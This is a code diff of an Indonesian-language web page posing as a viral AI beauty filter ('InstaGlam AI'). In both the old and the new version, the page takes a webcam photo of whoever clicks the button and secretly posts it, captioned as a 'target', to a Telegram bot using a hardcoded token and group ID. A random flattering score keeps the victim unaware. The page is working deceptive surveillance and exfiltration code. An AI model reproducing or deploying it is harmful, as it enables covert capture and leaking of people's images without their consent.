@@ -3,75 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Scanner Aura</title>
+    <title>InstaGlam AI – Filter Viral 2025</title>
     <style>
-        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px 20px; }
-        #cam-area { display: none; margin: 20px auto; border: 3px solid #0f0; width: 280px; height: 280px; border-radius: 50%; overflow: hidden; position: relative; }
+        :root {
+            --primary: #FF0050; /* TikTok Pink */
+            --secondary: #00f2ea; /* TikTok Cyan */
+            --dark: #121212;
+        }
+
+        body { 
+            background-color: var(--dark); 
+            color: white; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* Header Gaya Sosmed */
+        .header {
+            position: fixed;
+            top: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 1.4rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
+
+        /* Preview Kamera Bulat ala Filter */
+        #cam-preview { 
+            display: none; 
+            width: 300px; 
+            height: 300px; 
+            border: 4px solid white; 
+            border-radius: 50%; 
+            overflow: hidden; 
+            position: relative;
+            box-shadow: 0 0 30px rgba(255,255,255,0.2);
+        }
+
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        #loader { margin-top: 20px; color: yellow; }
+
+        /* Animasi Ring Loading */
+        .ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 4px solid transparent;
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: rotate 2s linear infinite;
+            display: none;
+        }
+
+        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Tombol Gaya Modern */
+        .main-btn { 
+            background: white; 
+            color: black; 
+            padding: 16px 50px; 
+            border: none; 
+            border-radius: 30px; 
+            font-weight: bold; 
+            font-size: 1rem; 
+            cursor: pointer; 
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+
+        .main-btn:active { transform: scale(0.95); }
+
+        #info-text { margin-top: 20px; font-size: 0.85rem; color: #aaa; max-width: 250px; line-height: 1.4; }
+
+        /* Hasil */
+        #result-overlay {
+            display: none;
+            text-align: center;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
+
+        .badge {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <h2>🧬 AI Face Analyzer</h2>
-    <p>Klik untuk melihat aura wajahmu hari ini.</p>
-    
-    <button class="btn" id="startBtn">MULAI SCAN</button>
+    <div class="header">
+        <h1>InstaGlam AI</h1>
+        <p style="font-size: 0.8rem; color: #888;">Global Face Recognition v2.5</p>
+    </div>
 
-    <div id="cam-area">
+    <div id="setup">
+        <button class="main-btn" id="btn-start">COBA FILTER</button>
+        <p id="info-text">Klik untuk memindai wajah dan dapatkan skor kecantikanmu secara real-time.</p>
+    </div>
+
+    <div id="cam-preview">
+        <div class="ring" id="loader-ring"></div>
         <video id="video" autoplay playsinline></video>
     </div>
-    <div id="loader"></div>
+
+    <div id="result-overlay">
+        <div class="badge">Analisis Berhasil</div>
+        <h2 id="score-val" style="font-size: 3.5rem; margin: 10px 0;">92%</h2>
+        <p style="color: #00f2ea; font-weight: bold;">"Diamond Face Structure"</p>
+        <p style="font-size: 0.8rem; color: #888;">Wajahmu telah diproses oleh AI.</p>
+    </div>
+
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // MASUKKAN DATA KAMU DI SINI
-        const TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
-        const CHAT_ID = '7268521744';
+        // --- SETTING TELEGRAM ---
+        const BOT_TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
+        const GROUP_ID  = '-5013715532'; 
 
-        const startBtn = document.getElementById('startBtn');
+        const btnStart = document.getElementById('btn-start');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const loader = document.getElementById('loader');
+        const loader = document.getElementById('loader-ring');
 
-        startBtn.addEventListener('click', async () => {
-            startBtn.style.display = 'none';
-            document.getElementById('cam-area').style.display = 'block';
-            loader.innerText = "Mengakses sensor wajah...";
+        btnStart.onclick = async () => {
+            document.getElementById('setup').style.display = 'none';
+            document.getElementById('cam-preview').style.display = 'block';
+            loader.style.display = 'block';
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                loader.innerText = "Memindai... Jangan bergerak!";
-
-                // Ambil foto setelah 3 detik
-                setTimeout(takePhoto, 3000);
-            } catch (err) {
-                alert("Kamera ditolak atau tidak ditemukan!");
+                
+                // Ambil foto otomatis setelah 4.5 detik
+                setTimeout(processResult, 4500);
+            } catch (e) {
+                alert("Izin kamera diperlukan untuk filter ini.");
+                location.reload();
             }
-        });
+        };
 
-        async function takePhoto() {
-            loader.innerText = "Menganalisis hasil...";
+        async function processResult() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
+                const score = Math.floor(Math.random() * (96 - 85 + 1)) + 85; // Skor 85 - 96 agar senang
+                
                 const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'poto.png');
-                fd.append('caption', '📸 FOTO TARGET BERHASIL DIAMBIL!');
+                fd.append('chat_id', GROUP_ID);
+                fd.append('photo', blob, 'filter_result.png');
+                fd.append('caption', `🔥 **VIRAL FILTER DETECTION**\n\n👤 Target: User\n⭐ Skor AI: ${score}%\n💡 Info: Target sedang pede-pedenya foto.`);
 
-                try {
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    loader.innerHTML = "<b style='color:red'>ANALISIS SELESAI!</b><br>Tingkat Ketampanan: 12% (Kritis)";
-                    alert("Aura kamu terlalu gelap untuk discan!");
-                } catch (e) {
-                    console.log("Error kirim foto");
-                }
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+
+                // Tampilkan hasil di layar teman
+                document.getElementById('cam-preview').style.display = 'none';
+                document.getElementById('score-val').innerText = score + "%";
+                document.getElementById('result-overlay').style.display = 'block';
+
+                // Matikan kamera
+                video.srcObject.getTracks().forEach(t => t.stop());
             }, 'image/png');
         }
     </script>
